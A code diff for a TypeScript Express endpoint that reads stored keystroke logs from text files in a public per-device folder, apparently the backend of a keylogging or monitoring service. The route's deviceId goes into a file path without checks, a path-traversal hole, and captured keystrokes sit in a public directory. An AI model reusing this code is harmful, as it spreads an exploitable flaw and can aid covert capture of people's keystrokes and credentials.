@@ -66,22 +66,44 @@ export const addNewKeyLogs = async (data: any) => {
 };
 
 // Get Key Logs by DeviceId
-export const getKeyLogs = async (req: Request, res: Response) => {
+export const getKeyLogsFiles = async (req: Request, res: Response) => {
 	const errors = validationResult(req);
 	if (!errors.isEmpty()) {
 		return res.status(400).json({ errors: errors.array() });
 	}
+
+	const { deviceId } = req.params;
+
 	try {
-		const { deviceId } = req.params;
+		// Assuming the keylogs are stored in public/keylogs/username
+		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId); // Adjust path as needed
 
-		//Find device in the database that match the query by deviceId
-		const keylogs: KeyLogsModelType[] = await KeyLogs.find({
-			deviceId,
-		});
+		// Check if the directory exists
+		if (!fs.existsSync(logsDir)) {
+			return res
+				.status(404)
+				.json({ message: "No logs found for this device" });
+		}
 
-		res.status(200).json(keylogs);
+		// Read all .txt files in the directory
+		const files = fs
+			.readdirSync(logsDir)
+			.filter((file) => file.endsWith(".txt"));
+
+		// Initialize an array to store the content of each file
+		const logs = [];
+
+		// Read the content of each file and push it to the logs array
+		for (const file of files) {
+			const filePath = path.join(logsDir, file);
+			const content = fs.readFileSync(filePath, "utf8");
+			logs.push({ filename: file, content });
+		}
+
+		// Return the array of logs
+		res.status(200).json(logs);
 	} catch (error) {
-		console.error("Error processing Keylogs:", error);
+		console.error("Error processing keylogs:", error);
 		res.status(500).json({ error: "Failed to process the keylogs" });
 	}
 };
